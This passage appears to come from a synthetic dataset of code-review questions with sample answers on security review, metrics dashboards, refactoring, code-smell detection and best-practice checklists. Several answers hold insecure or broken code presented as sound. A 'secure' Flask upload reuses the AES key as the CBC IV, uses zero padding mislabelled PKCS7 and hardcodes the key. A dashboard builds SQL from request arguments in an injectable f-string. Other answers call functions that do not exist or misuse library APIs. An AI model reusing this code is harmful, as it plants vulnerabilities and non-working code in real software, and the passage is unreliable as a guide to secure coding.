statements.\n3. No direct concatenation of user input with SQL strings.\n4. Appropriate error handling to avoid exposing sensitive information.\n\nThese examples demonstrate medium complexity security checks that should be part of a code review process to ensure the application's security."}, {"L2_TASK": "Code review", "L3_TASK": "Security review integration", "Complexity_Level": "extremely difficult", "Response": "Question 1:\nSuppose you are working on a web application that handles sensitive user data and integrates with a third-party API for authentication. The application has been developed using Node.js and Express.js. The code review team has identified potential security vulnerabilities related to unvalidated user input and insufficient API communication encryption. Implement a secure way to validate user input and establish a secure connection with the third-party API using mutual TLS (Transport Layer Security).\n\n```javascript\n// Import necessary modules\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst crypto = require('crypto');\nconst fs = require('fs');\nconst https = require('https');\nconst http = require('http');\n\n// Configure Express app\nconst app = express();\napp.use(bodyParser.json());\n\n// Validate user input (example: email and password)\napp.post('/login', (req, res) => {\n  const { email, password } = req.body;\n\n  // Perform input validation (example: email format and password length)\n  const isValidEmail = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email);\n  const isValidPassword = password.length >= 12 && /[A-Z]/.test(password) && /[a-z]/.test(password) && /\\d/.test(password) && /[^A-Za-z0-9]/.test(password);\n\n  if (!isValidEmail || !isValidPassword) {\n    return res.status(400).json({ error: 'Invalid email or password' });\n  }\n\n  // Hash the password before sending it to the API\n  const hashedPassword = crypto.pbkdf2Sync(password, process.env.SALT, 10000, 32).toString('hex');\n\n  // Establish a secure connection with the third-party API using mutual TLS\n  const options = {\n    hostname: 'third-party-api.com',\n    port: 443,\n    path: '/auth',\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    ca: fs.readFileSync('trusted-ca.pem'), // Certificate authority\n    key: fs.readFileSync('client-key.pem'), // Client private key\n    cert: fs.readFileSync('client-cert.pem'), // Client certificate\n    passphrase: process.env.CLIENT_CERT_PASSPHRASE, // Optional passphrase for client key\n    rejectUnauthorized: true, // Validate server certificate\n  };\n\n  const reqTLS = https.request(options, (apiRes) => {\n    let data = '';\n    apiRes.on('data', (chunk) => {\n      data += chunk;\n    });\n    apiRes.on('end', () => {\n      // Handle the API response\n      // ...\n      res.json({ success: 'Authenticated' });\n    });\n  });\n\n  reqTLS.on('error', (error) => {\n    console.error('Error in API request:', error);\n    res.status(500).json({ error: 'Internal server error' });\n  });\n\n  reqTLS.write(JSON.stringify({ email, hashedPassword }));\n  reqTLS.end();\n});\n\nconst server = http.createServer(app);\nserver.listen(3000, () => {\n  console.log('Server is running on port 3000');\n});\n```\n\nConcept: Security review integration\n\nQuestion 2:\nYou have to design a secure file upload system for a web application built with Python Flask, where users can upload sensitive files that need to be encrypted at rest and protected against unauthorized access. Additionally, the system should have a mechanism to detect and prevent malicious file uploads, such as executables or scripts.\n\n```python\nfrom flask import Flask, request, redirect, url_for\nfrom werkzeug.utils import secure_filename\nimport os\nimport hashlib\nimport base64\nfrom cryptography.fernet import Fernet\nfrom cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\nfrom cryptography.hazmat.backends import default_backend\nimport magic\n\napp = Flask(__name__)\n\n# Configuration\nUPLOAD_FOLDER = 'uploads'\nALLOWED_EXTENSIONS = {'pdf', 'txt', 'docx'}\nENCRYPTION_KEY = b'your-32-byte-encryption-key'\n\nif not os.path.exists(UPLOAD_FOLDER):\n    os.makedirs(UPLOAD_FOLDER)\n\ndef allowed_file(filename):\n    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\ndef encrypt_file(file_path, key):\n    backend = default_backend()\n    cipher = Cipher(algorithms.AES(key), modes.CBC(key[:16]), backend=backend)\n    encryptor = cipher.encryptor()\n\n    with open(file_path, 'rb') as f:\n        data = f.read()\n    padded_data = data + b'\\x00' * (-len(data) % 16)  # PKCS7 padding\n    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()\n\n    return base64.b64encode(encrypted_data).decode('utf-8')\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return redirect(request.url)\n    file = request.files['file']\n    if file.filename == '':\n        return redirect(request.url)\n    if file and allowed_file(file.filename):\n        filename = secure_filename(file.filename)\n        file.save(os.path.join(UPLOAD_FOLDER, filename))\n\n        # Detect and prevent malicious file uploads\n        file_type = magic.from_file(os.path.join(UPLOAD_FOLDER, filename), mime=True)\n        if not file_type.startswith('text') and not file_type.startswith('application/vnd.openxmlformats'):\n            os.remove(os.path.join(UPLOAD_FOLDER, filename))\n            return 'Invalid file type', 400\n\n        encrypted_filename = f'{hashlib.sha256(filename.encode()).hexdigest()}.enc'\n        encrypted_content = encrypt_file(os.path.join(UPLOAD_FOLDER, filename), ENCRYPTION_KEY)\n        with open(os.path.join(UPLOAD_FOLDER, encrypted_filename), 'w') as f:\n            f.write(encrypted_content)\n\n        os.remove(os.path.join(UPLOAD_FOLDER, filename))\n\n        return redirect(url_for('index'))\n    else:\n        return redirect(request.url)\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nConcept: Security review integration"}, {"L2_TASK": "Code review", "L3_TASK": "Review metrics and dashboards", "Complexity_Level": "medium", "Response": "Question 1:\nProblem: Develop a code review dashboard that calculates and displays the following metrics: lines of code (LOC), code complexity (Cyclomatic Complexity), and code coverage for unit tests. The dashboard should be able to generate these metrics for a given Python project.\n\nSolution:\nWe will use the `pycodestyle`, `pylint`, and `coverage` libraries to calculate the mentioned metrics. Here's an example Python script to achieve this:\n\n```python\nimport os\nimport ast\nimport subprocess\nimport coverage\n\ndef get_loc(path):\n    total_loc = 0\n    for root, dirs, files in os.walk(path):\n        for file in files:\n            if file.endswith(\".py\"):\n                total_loc += sum(1 for _ in open(os.path.join(root, file)))\n    return total_loc\n\ndef get_cyclomatic_complexity(path):\n    result = subprocess.run([\"pylint\", \"--reports=n\", \"--disable=all\", \"--enable=C\", path], capture_output=True, text=True)\n    complexity_sum = 0\n    for line in result.stdout.splitlines():\n        if \"C0111\" in line:\n            complexity_sum += int(line.split()[1])\n    return complexity_sum\n\ndef get_code_coverage(path):\n    cov = coverage.Coverage()\n    cov.start()\n    subprocess.run([\"python\", \"-m\", \"unittest\", \"-v\", os.path.join(path, \"tests\")])\n    cov.stop()\n    cov.save()\n    return cov.statements_covered() / cov.statements()\n\ndef main(project_path):\n    loc = get_loc(project_path)\n    complexity = get_cyclomatic_complexity(project_path)\n    coverage_rate = get_code_coverage(project_path)\n\n    print(f\"Lines of Code: {loc}\")\n    print(f\"Cyclomatic Complexity: {complexity}\")\n    print(f\"Code Coverage: {coverage_rate * 100}%\")\n\nif __name__ == \"__main__\":\n    main(\"/path/to/your/project\")\n```\n\nConcept: Code Metrics\n\nQuestion 2:\nProblem: Create a monitoring dashboard for a Node.js application that tracks response times, error rates, and memory usage. The dashboard should update in real-time and send alerts when the application's performance degrades beyond predefined thresholds.\n\nSolution:\nWe will use `Express` for the Node.js application, `Prometheus` for monitoring, and `Grafana` for the dashboard. Here's an outline of how to set it up:\n\n1. Install required packages:\n```bash\nnpm install express prom-client\n```\n2. Configure Prometheus client in your Node.js app:\n```javascript\nconst express = require('express');\nconst { promClient } = require('prom-client');\nconst app = express();\n\nconst responseTimeCollector = new promClient.ResponseTimeCollector({\n  name: 'my_app_response_time',\n  help: 'Response time for my app',\n  labelNames: ['method', 'statusCode', 'url'],\n});\n\napp.use(responseTimeCollector.middleware);\n\napp.get('/', (req, res) => {\n  res.send('Hello, World!');\n});\n\napp.listen(3000, () => {\n  console.log('App is listening on port 3000');\n});\n```\n3. Set up Prometheus to scrape metrics from your app:\n```bash\nprometheus.yml:\nscrape_configs:\n  - job_name: 'my-node-app'\n    static_configs:\n      - targets: ['localhost:3000/metrics']\n```\n4. Start Prometheus and Grafana (assuming they are already installed):\n```bash\n# Start Prometheus\nprometheus --config.file=prometheus.yml\n\n# Start Grafana\ngrafana-server web\n```\n5. Create a Grafana dashboard to visualize the metrics:\n- In Prometheus, go to `Targets` to find the metrics endpoint URL.\n- In Grafana, create a new dashboard and add the following panels:\n  - A `Graph` panel for response time, with `my_app_response_time` as the query.\n  - A `Singlestat` panel for error rate, calculating `(sum(rate(my_app_response_time{statusCode=500}[1m])) / sum(rate(my_app_response_time[1m])))` as the query.\n  - A `Singlestat` panel for memory usage, using Node.js process memory metrics like `process_memory_rss_bytes`.\n\n6. Configure alerts in Grafana for performance degradation:\n- Create a new alert rule with conditions based on the response time, error rate, or memory usage thresholds.\n\nConcept: Application Monitoring and Dashboards"}, {"L2_TASK": "Code review", "L3_TASK": "Review metrics and dashboards", "Complexity_Level": "extremely difficult", "Response": "Question 1: Problem:\nDevelop a comprehensive code review dashboard that calculates and displays various metrics, including code complexity, cyclomatic complexity, code churn, technical debt, and code coverage. The dashboard should also support filtering by file, author, and time frame, allowing for in-depth analysis of code changes and their impact on the overall codebase.\n\nSolution:\nConcept: Code Metrics, Data Visualization, Backend Development\nLanguage: Python (using Flask, SQLAlchemy, and Plotly)\n\nExample Code:\n```python\nfrom flask import Flask, request, render_template\nfrom sqlalchemy import create_engine\nfrom plotly.graph_objs import Bar, Layout\nimport pandas as pd\n\napp = Flask(__name__)\n\n# Connect to the database\nengine = create_engine('sqlite:///code_reviews.db')\n\ndef calculate_metrics(file_id, start_date, end_date):\n    query = f\"\"\"\n    SELECT file_name, author, complexity, cyclomatic_complexity, code_churn, technical_debt, code_coverage\n    FROM code_reviews\n    WHERE file_id = {file_id} AND date BETWEEN '{start_date}' AND '{end_date}'\n    \"\"\"\n    results = pd.read_sql_query(query, engine)\n    return results\n\n@app.route('/dashboard')\ndef dashboard():\n    file_id = request.args.get('file_id', None)\n    start_date = request.args.get('start_date', None)\n    end_date = request.args.get('end_date', None)\n\n    data = calculate_metrics(file_id, start_date, end_date)\n\n    complexity_data = data.groupby('file_name')['complexity'].mean().reset_index()\n    complexity_trace = Bar(x=complexity_data['file_name'], y=complexity_data['complexity'], name='Code Complexity')\n\n    cyclomatic_data = data.groupby('file_name')['cyclomatic_complexity'].mean().reset_index()\n    cyclomatic_trace = Bar(x=cyclomatic_data['file_name'], y=cyclomatic_data['cyclomatic_complexity'], name='Cyclomatic Complexity')\n\n    layout = Layout(title='Code Review Metrics', barmode='group')\n\n    fig = dict(data=[complexity_trace, cyclomatic_trace], layout=layout)\n    return render_template('dashboard.html', plot=fig.to_html(full_html=False))\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\nQuestion 2: Problem:\nDesign a system that automatically identifies code review patterns by analyzing historical code review data, such as common issues, trends in review time, and the impact of external factors (e.g., team size, code complexity) on review efficiency. The system should provide suggestions for improving the code review process and enable exporting reports.\n\nSolution:\nConcept: Machine Learning, Data Analysis, Backend Development\nLanguage: Python (using Scikit-learn, Pandas, and Flask)\n\nExample Code:\n```python\nfrom flask import Flask, request, render_template\nimport pandas as pd\nfrom sklearn.ensemble import RandomForestClassifier\nfrom sklearn.model_selection import train_test_split\nfrom sklearn.metrics import classification_report\nimport pandas as pd\n\napp = Flask(__name__)\n\n# Load historical code review data\ndata = pd.read_csv('code_reviews.csv')\n\n@app.route('/report')\ndef generate_report():\n    # Preprocess data and train a model\n    X = data[['team_size', 'code_complexity', 'review_time']]\n    y = data['review_issue']\n    X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n    model = RandomForestClassifier(n_estimators=100, random_state=42)\n    model.fit(X_train, y_train)\n\n    # Evaluate the model\n    y_pred = model.predict(X_test)\n    print(classification_report(y_test, y_pred))\n\n    # Generate report suggestions\n    suggestions = analyze_patterns(model.feature_importances_)\n    return render_template('report.html', suggestions=suggestions)\n\ndef analyze_patterns(feature_importances):\n    # Perform analysis based on feature importances\n    # ...\n    return [\"Improve code complexity\", \"Optimize team size\", \"Reduce review time\"]\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\nPlease note that these examples are simplified and do not include the full implementation of the database, data visualization templates, or machine learning model. The actual implementation would require more extensive code and configuration."}, {"L2_TASK": "Code review", "L3_TASK": "Automated refactor suggestions", "Complexity_Level": "medium", "Response": "Question 1: Write a medium complexity problem where a code review tool needs to suggest automated refactoring for\u5197\u4f59\u4ee3\u7801 (Redundant Code). \n\nConcept: Automated refactor suggestions\n\nProblem: A codebase contains multiple functions with similar code blocks for processing lists of numbers. The code review tool should suggest refactoring to eliminate redundancy and promote code reuse.\n\nSolution:\n```python\n# Original code with redundant code\ndef process_list1(numbers):\n    result = []\n    for num in numbers:\n        if num > 10:\n            result.append(num * 2)\n    return result\n\ndef process_list2(numbers):\n    result = []\n    for num in numbers:\n        if num > 10:\n            result.append(num * 2)\n    return result\n\ndef process_list3(numbers):\n    result = []\n    for num in numbers:\n        if num > 10:\n            result.append(num * 2)\n    return result\n\n# Refactored code\ndef process_numbers(numbers, operation=lambda x: x * 2):\n    result = []\n    for num in numbers:\n        if num > 10:\n            result.append(operation(num))\n    return result\n\n# After refactoring, the original functions can be replaced with calls to process_numbers\ndef process_list1(numbers):\n    return process_numbers(numbers)\n\ndef process_list2(numbers):\n    return process_numbers(numbers)\n\ndef process_list3(numbers):\n    return process_numbers(numbers)\n```\nQuestion 2: Another medium complexity problem where a code review tool should suggest automated refactoring for complex nested control flow.\n\nConcept: Automated refactor suggestions\n\nProblem: The given code has a deeply nested if-else structure that makes it difficult to read and maintain. The code review tool should recommend a more maintainable approach.\n\nSolution:\n```python\n# Original code with nested if-else\ndef check_status(status_code):\n    if status_code >= 200 and status_code < 300:\n        return 'Success'\n    elif status_code >= 300 and status_code < 400:\n        return 'Redirection'\n    elif status_code >= 400 and status_code < 500:\n        return 'Client Error'\n    elif status_code >= 500:\n        return 'Server Error'\n    else:\n        return 'Invalid Status Code'\n\n# Refactored code using a dictionary mapping\nstatus_map = {\n    range(200, 300): 'Success',\n    range(300, 400): 'Redirection',\n    range(400, 500): 'Client Error',\n    range(500, float('inf')): 'Server Error'\n}\n\ndef check_status(status_code):\n    for range_, status in status_map.items():\n        if status_code in range_:\n            return status\n    return 'Invalid Status Code'\n```\nIn both solutions, the refactored code is more maintainable, easier to read, and promotes code reuse. A code review tool would help identify these opportunities for improvement and suggest the refactorings."}, {"L2_TASK": "Code review", "L3_TASK": "Automated refactor suggestions", "Complexity_Level": "extremely difficult", "Response": "Question 1: Implement a complex code review tool that can analyze a large codebase to detect and suggest automated refactorings for deep inheritance hierarchies and excessive use of global variables.\n\n**Concept**: Inheritance, Global Variables\n\n**Solution**: In Python, we can use the `ast` module to parse the code, detect the inheritance hierarchy, and global variable usage. A simplified example would be:\n\n```python\nimport ast\nimport inspect\nfrom collections import defaultdict\n\nclass InheritanceAnalyzer(ast.NodeVisitor):\n    def __init__(self):\n        self.class_hierarchy = defaultdict(set)\n        self.global_vars = set()\n\n    def visit_ClassDef(self, node):\n        parent = node\n        while parent:\n            if parent.name not in self.class_hierarchy[node.name]:\n                self.class_hierarchy[node.name].add(parent.name)\n            parent = self.find_base_class(parent)\n\n    def find_base_class(self, node):\n        for base in node.bases:\n            if isinstance(base, ast.Name):\n                return base\n        return None\n\n    def visit_Name(self, node):\n        if node.id not in self.global_vars and inspect.isglobal(node):\n            self.global_vars.add(node.id)\n\ndef suggest_refactorings(src_code):\n    tree = ast.parse(src_code)\n    analyzer = InheritanceAnalyzer()\n    analyzer.visit(tree)\n    \n    refactor_suggestions = []\n\n    for class_name, hierarchy in analyzer.class_hierarchy.items():\n        if len(hierarchy) > 3:\n            refactor_suggestions.append(f\"Consider using composition or interfaces for '{class_name}' due to deep inheritance hierarchy.\")\n\n    for global_var in analyzer.global_vars:\n        refactor_suggestions.append(f\"Replace global variable '{global_var}' with a class-level or local variable, or use a context manager.\")\n\n    return refactor_suggestions\n\n# Example usage:\nsrc_code = \"\"\"\nclass A:\n    pass\n\nclass B(A):\n    pass\n\nclass C(B):\n    pass\n\nclass D(C):\n    pass\n\ndef some_func():\n    global x\n    x = 5\n\"\"\"\n\nrefactor_suggestions = suggest_refactorings(src_code)\nfor suggestion in refactor_suggestions:\n    print(suggestion)\n```\n\nThis example is quite simplified and doesn't handle all edge cases, but it demonstrates the approach to analyzing inheritance and global variables. A full-fledged tool would require more advanced techniques like analyzing method complexity, detecting code smells, and integrating with version control systems.\n\nQuestion 2: Develop a code review tool that identifies complex, hard-to-read, and error-prone code patterns and suggests appropriate refactorings using AI-assisted analysis.\n\n**Concept**: Code Complexity, AI\n\n**Solution**: This problem requires a more advanced solution that combines natural language processing (NLP) and machine learning (ML) techniques to identify complex code patterns. Here's a high-level outline of a possible solution using Python and a pre-trained ML model:\n\n1. Parse code into tokens and abstract syntax trees (ASTs) using `ast` module.\n2. Extract code features such as length, cyclomatic complexity, and number of conditionals, loops, and function calls.\n3. Use NLP techniques (e.g., `spacy`) to extract comments and identifiers, then tokenize and vectorize them.\n4. Train an ML model (e.g., LSTM, BERT) on a large dataset of code snippets labeled with complexity and error-proneness indicators.\n5. Develop an AI-assisted suggestion engine that applies the model's predictions to provide refactorings.\n\nA simplified example demonstrates the extraction of code features:\n\n```python\nimport ast\nimport spacy\n\ndef code_features(src_code):\n    nlp = spacy.load(\"en_core_web_sm\")\n    ast_tree = ast.parse(src_code)\n    ast.visit_count = 0\n\n    def count_complexity(node):\n        ast.visit_count += 1\n        if isinstance(node, (ast.If, ast.For, ast.While, ast.With, ast.Try, ast.FunctionDef)):\n            ast.visit_count += 1\n\n    ast.walk(ast_tree, count_complexity)\n\n    tokens = nlp(src_code)\n    identifier_count = sum(1 for token in tokens if token.pos_ == \"NOUN\" and token.is_alpha)\n\n    return {\n        \"code_length\": len(src_code),\n        \"complexity_count\": ast.visit_count,\n        \"identifier_count\": identifier_count\n    }\n\nsrc_code = \"def complex_func(x, y): if x > 0: for z in range(y): return z * z\"\nfeatures = code_features(src_code)\nprint(features)\n```\n\nFor a complete solution, you would need to build and train an ML model, which is beyond the scope of this example. Note that this problem is extremely complex and requires access to a large code dataset and expertise in NLP and ML."}, {"L2_TASK": "Code review", "L3_TASK": "Code smell detection", "Complexity_Level": "medium", "Response": "Question 1:\nConcept: Code smell detection - Long Method\n\nProblem: You have a function in Python that performs multiple tasks, making it difficult to understand and maintain. Identify this code smell and propose a refactored version.\n\nOriginal code:\n```python\ndef process_data(data):\n    # Task 1: Preprocess data\n    for i in range(len(data)):\n        if data[i] < 0:\n            data[i] = 0\n\n    # Task 2: Calculate mean\n    mean = sum(data) / len(data)\n\n    # Task 3: Normalize data\n    for i in range(len(data)):\n        data[i] = (data[i] - mean) / mean\n\n    # Task 4: Filter outliers\n    threshold = 3\n    for i in range(len(data)):\n        if abs(data[i]) > threshold * mean:\n            data[i] = 0\n\n    return data\n```\nRefactored code:\n```python\ndef preprocess_data(data):\n    for i in range(len(data)):\n        if data[i] < 0:\n            data[i] = 0\n    return data\n\ndef calculate_mean(data):\n    return sum(data) / len(data)\n\ndef normalize_data(data, mean):\n    for i in range(len(data)):\n        data[i] = (data[i] - mean) / mean\n    return data\n\ndef filter_outliers(data, mean, threshold):\n    for i in range(len(data)):\n        if abs(data[i]) > threshold * mean:\n            data[i] = 0\n    return data\n\ndef process_data(data):\n    preprocessed_data = preprocess_data(data)\n    mean = calculate_mean(preprocessed_data)\n    normalized_data = normalize_data(preprocessed_data, mean)\n    filtered_data = filter_outliers(normalized_data, mean, 3)\n    return filtered_data\n```\nQuestion 2:\nConcept: Code smell detection - Tight Coupling\n\nProblem: In a Java application, two classes are tightly coupled, making it hard to maintain and test them independently. Identify this code smell and provide a refactored version using the dependency injection principle.\n\nOriginal code:\n```java\npublic class OrderService {\n    private PaymentGateway paymentGateway = new StripePaymentGateway();\n\n    public void processOrder(Order order) {\n        // Process order logic...\n        if (!paymentGateway.processPayment(order.getAmount())) {\n            throw new PaymentFailedException();\n        }\n    }\n}\n\npublic class StripePaymentGateway implements PaymentGateway {\n    // Implementation details for Stripe payment gateway...\n}\n```\nRefactored code:\n```java\npublic class OrderService {\n    private PaymentGateway paymentGateway;\n\n    public OrderService(PaymentGateway paymentGateway) {\n        this.paymentGateway = paymentGateway;\n    }\n\n    public void processOrder(Order order) {\n        // Process order logic...\n        if (!paymentGateway.processPayment(order.getAmount())) {\n            throw new PaymentFailedException();\n        }\n    }\n}\n\npublic interface PaymentGateway {\n    boolean processPayment(double amount);\n}\n\npublic class StripePaymentGateway implements PaymentGateway {\n    // Implementation details for Stripe payment gateway...\n}\n\n// Usage:\nPaymentGateway paymentGateway = new StripePaymentGateway();\nOrderService orderService = new OrderService(paymentGateway);\norderService.processOrder(order);\n```\nIn both examples, the code smells have been identified and addressed through refactoring, improving code readability, maintainability, and testability."}, {"L2_TASK": "Code review", "L3_TASK": "Code smell detection", "Complexity_Level": "extremely difficult", "Response": "Question 1: Develop an advanced code smell detector tool that identifies complex and subtle code smells, such as \"Long Method\", \"God Class\", and \"Feature Envy\", in a Java codebase. The tool should also suggest potential refactoring strategies to improve the code quality.\n\nConcept: Code Smell Detection\n\nSolution:\n```java\nimport java.io.File;\nimport java.util.ArrayList;\nimport java.util.List;\nimport org.apache.commons.lang3.StringUtils;\nimport org.eclipse.jdt.core.dom.AST;\nimport org.eclipse.jdt.core.dom.ASTParser;\nimport org.eclipse.jdt.core.dom.CompilationUnit;\nimport org.reflections.Reflections;\nimport com.github.javaparser.ast.body.MethodDeclaration;\nimport com.github.javaparser.ast.visitor.VoidVisitorAdapter;\n\npublic class CodeSmellDetector {\n    public static void main(String[] args) {\n        File codeBase = new File(\"/path/to/codebase\");\n        Reflections reflections = new Reflections(\"your.package.name\");\n        Set<Class<?>> classes = reflections.getSubTypesOf(Object.class);\n        \n        for (Class<?> clazz : classes) {\n            analyzeClass(clazz.getName());\n        }\n    }\n\n    private static void analyzeClass(String className) {\n        try {\n            String source = Files.readString(Paths.get(\"/path/to/sourcefiles\", className + \".java\"), StandardCharsets.UTF_8);\n            CompilationUnit cu = JavaParser.parse(source);\n            List<MethodDeclaration> methods = cu.findAll(MethodDeclaration.class);\n\n            for (MethodDeclaration method : methods) {\n                if (isLongMethod(method)) {\n                    System.out.println(\"Long Method detected in \" + className + \": \" + method.getNameAsString());\n                    suggestRefactoring(method);\n                }\n\n                if (isGodClass(className, methods)) {\n                    System.out.println(\"God Class detected: \" + className);\n                    suggestRefactoringForGodClass(className);\n                }\n\n                if (isFeatureEnvy(method, className)) {\n                    System.out.println(\"Feature Envy detected in \" + className + \": \" + method.getNameAsString());\n                    suggestRefactoringForFeatureEnvy(method);\n                }\n            }\n        } catch (IOException e) {\n            System.err.println(\"Error reading source file: \" + e.getMessage());\n        }\n    }\n\n    private static boolean isLongMethod(MethodDeclaration method) {\n        // Define your threshold for a long method\n        int threshold = 50;\n        return method.getBody().getStatements().size() > threshold;\n    }\n\n    private static boolean isGodClass(String className, List<MethodDeclaration> methods) {\n        // Implement a complex algorithm to detect God Class\n        // This might involve analyzing method dependencies, lines of code, and number of responsibilities\n    }\n\n    private static boolean isFeatureEnvy(MethodDeclaration method, String className) {\n        // Analyze method usage to detect if it shows Feature Envy\n        // This involves looking at the accessed class members and comparing them with the current class\n    }\n\n    private static void suggestRefactoring(MethodDeclaration method) {\n        // Suggest extracting a method or moving code to another class\n    }\n\n    private static void suggestRefactoringForGodClass(String className) {\n        // Suggest breaking the class into smaller, cohesive classes\n    }\n\n    private static void suggestRefactoringForFeatureEnvy(MethodDeclaration method) {\n        // Suggest moving the method to the class it is dependent on\n    }\n}\n```\nThis solution uses the JavaParser library to parse the source code, detect methods, and analyze their characteristics. The `isLongMethod`, `isGodClass`, and `isFeatureEnvy` methods implement the logic for identifying the specific code smells. The `suggestRefactoring` methods provide potential refactoring strategies.\n\nQuestion 2: Design a"}, {"L2_TASK": "Code review", "L3_TASK": "Best practices checklist", "Complexity_Level": "medium", "Response": "Question 1: How can you refactor a piece of code to improve readability and adhere to best practices for naming conventions and function composition in a Python application?\n\nProblem:\n```python\ndef process_data(file_content):\n    data = file_content.split('\\n')\n    processed_data = [x.strip() for x in data if x.strip() != '']\n    return filter_data(processed_data)\n\ndef filter_data(data):\n    return [x for x in data if len(x) > 5]\n\n# Usage\nfile_content = \"Some data\\nMore data\\n\"\nresult = process_data(file_content)\n```\n\nSolution:\n```python\ndef read_and_filter(file_content):\n    lines = file_content.split('\\n')\n    non_empty_lines = [line.strip() for line in lines if line.strip()]\n    long_lines = [line for line in non_empty_lines if len(line) > 5]\n    return long_lines\n\n# Usage\nfile_content = \"Some data\\nMore data\\n\"\nresult = read_and_filter(file_content)\n```\nExplanation: The refactored code combines the `process_data` and `filter_data` functions into a single function `read_and_filter`. This makes the code more concise and easier to understand. The function names are improved to better reflect their purpose. The list comprehension in `filter_data` is also simplified to remove the nested comprehension.\n\nQuestion 2: How can you improve a JavaScript function to follow async/await best practices, error handling, and avoid global variables?\n\nProblem:\n```javascript\nlet users = [];\n\nfunction fetchData(url) {\n  return new Promise((resolve, reject) => {\n    fetch(url)\n      .then(response => response.json())\n      .then(data => {\n        users = data;\n        resolve();\n      })\n      .catch(error => reject(error));\n  });\n}\n\nfetchData('https://api.example.com/users')\n  .then(() => console.log(users))\n  .catch(error => console.error(error));\n```\n\nSolution:\n```javascript\nasync function fetchUsers(url) {\n  try {\n    const response = await fetch(url);\n    if (!response.ok) {\n      throw new Error(`Error: ${response.status} - ${response.statusText}`);\n    }\n    const data = await response.json();\n    return data;\n  } catch (error) {\n    console.error(error);\n  }\n}\n\nfetchUsers('https://api.example.com/users')\n  .then(users => console.log(users))\n  .catch(error => console.error(error));\n```\nExplanation: The refactored code converts the `fetchData` function to an async function `fetchUsers` that uses `await` for cleaner syntax. It also adds proper error handling using `try...catch` blocks. The `users` variable is no longer global, preventing potential naming conflicts and keeping the scope clean. The response is checked for status before parsing to ensure successful fetch."}, {"L2_TASK": "Code review", "L3_TASK": "Best practices checklist", "Complexity_Level": "extremely difficult", "Response": "Question 1: Implement a code review tool that checks for adherence to a comprehensive best practices checklist, including performance optimization, security, and maintainability aspects. The tool should analyze a given codebase in Python and provide detailed reports.\n\nConcept: Code Review, Best Practices Checklist\n\nSolution:\n```python\nimport ast\nimport sys\nimport hashlib\nimport security_check\nimport performance_check\nimport maintainability_check\n\nclass CodeReviewTool:\n    def __init__(self, file_path):\n        self.file_path = file_path\n        self.tree = ast.parse(open(file_path, 'r').read())\n        self.checks = {\n            'security': security_check.SecurityCheck(),\n            'performance': performance_check.PerformanceCheck(),\n            'maintainability': maintainability_check.MaintainabilityCheck()\n        }\n        self.reports = {}\n\n    def analyze(self):\n        for check_name, check in self.checks.items():\n            self.reports[check_name] = check.run_analysis(self.tree)\n\n    def generate_report(self):\n        report_output = f\"Code Review Report for {self.file_path}\\n\\n\"\n        for check_name, report in self.reports.items():\n            report_output += f\"{check_name.capitalize()}:\\n{report}\\n\\n\"\n\n        return report_output\n\n\nclass SecurityCheck:\n    def run_analysis(self, tree):\n        # Example security checks: SQL injection, XSS, input validation, etc.\n        pass\n\n\nclass PerformanceCheck:\n    def run_analysis(self, tree):\n        # Example performance checks: excessive computations, inefficient loops, data structure usage, etc.\n        pass\n\n\nclass MaintainabilityCheck:\n    def run_analysis(self, tree):\n        # Example maintainability checks: code complexity, naming conventions, DRY principle, etc.\n        pass\n\n\ndef main():\n    if len(sys.argv) != 2:\n        print(\"Usage: python code_review_tool.py <file.py>\")\n        sys.exit(1)\n\n    file_path = sys.argv[1]\n    tool = CodeReviewTool(file_path)\n    tool.analyze()\n    print(tool.generate_report())\n\n\nif __name__ == \"__main__\":\n    main()\n```\nExplanation: The code defines a `CodeReviewTool` class that reads in a Python file, parses its abstract syntax tree (AST), and runs various checks for security, performance, and maintainability using separate classes for each aspect. The example checks are placeholders, as implementing actual checks would be complex and domain-specific.\n\nQuestion 2: Develop a code review platform with a web interface that integrates with Git repositories, allowing users to request and perform code reviews, track review history, and enforce organization-specific best practice guidelines. Implement using a full-stack approach with React for frontend, Express for backend, and MongoDB for database.\n\nConcept: Web Development, Full Stack Development\n\nSolution (Frontend - React component):\n```jsx\nimport React, { useState, useEffect } from 'react';\nimport axios from 'axios';\n\nconst CodeReviewRequest = ({ repoId }) => {\n  const [reviewers, setReviewers] = useState([]);\n  const [selectedReviewers, setSelectedReviewers] = useState([]);\n  const [requestMessage, setRequestMessage] = useState('');\n\n  useEffect(() => {\n    axios.get(`/api/reviewers/${repoId}`)\n      .then(res => setReviewers(res.data))\n      .catch(err => console.error(err));\n  }, [repoId]);\n\n  const handleSubmit = (e) => {\n    e.preventDefault();\n    axios.post(`/api/codeReviewRequests/${repoId}`, {\n      reviewers: selectedReviewers,\n      message: requestMessage\n    })\n      .then(() => alert('Request submitted'))\n      .catch(err => alert('Error submitting request: ', err.message));\n  };\n\n  return (\n    <form onSubmit={handleSubmit}>\n      <h2>Select Reviewers:</h2>\n      <div>\n        {reviewers.map(reviewer => (\n          <label key={reviewer.id}>\n            <input\n              type=\"checkbox\"\n              value={reviewer.id}\n              checked={selectedReviewers.includes(reviewer.id)}\n              onChange={() => setSelectedReviewers(prev => toggleItem(prev, reviewer.id))}\n            />\n            {reviewer.name}\n          </label>\n        ))}\n      </div>\n      <textarea value={requestMessage} onChange={e => setRequestMessage(e.target.value)} placeholder=\"Enter a message for the reviewers\"></textarea>\n      <button type=\"submit\">Request Review</button>\n    </form>\n  );\n};\n\nfunction toggleItem(array, itemId) {\n  const itemIndex = array.indexOf(itemId);\n  if (itemIndex === -1) {\n    return [...array, itemId];\n  }\n  return [...array.slice(0, itemIndex), ...array.slice(itemIndex + 1)];\n}\n\nexport default CodeReviewRequest;\n```\nSolution (Backend - Express route):\n```javascript\nconst express = require('express');\nconst mongoose = require('mongoose');\nconst CodeReviewRequest = require('../models/codeReviewRequest');\nconst Reviewer = require('../models/reviewer');\n\nconst router = express.Router();\n\nrouter.get('/reviewers/:repoId', async (req, res) => {\n 